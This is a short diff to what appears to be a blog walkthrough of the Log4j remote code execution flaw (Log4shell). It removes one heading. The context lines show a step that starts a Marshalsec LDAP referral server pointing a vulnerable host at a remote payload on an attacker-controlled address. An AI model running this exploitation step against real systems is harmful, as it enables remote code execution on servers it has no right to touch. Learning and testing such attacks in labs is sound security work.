@@ -18,8 +18,6 @@ The widely-used java logging library, Log4j, has an unauthenticated remote code 
 
 <!--more-->
 
-## Log4shell
-
 ### Setting up LDAP server using Marshalsec
 [Marshalsec Github](https://github.com/mbechler/marshalsec)
 - `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "https://10.10.10.10:8888/#log4jrce"`
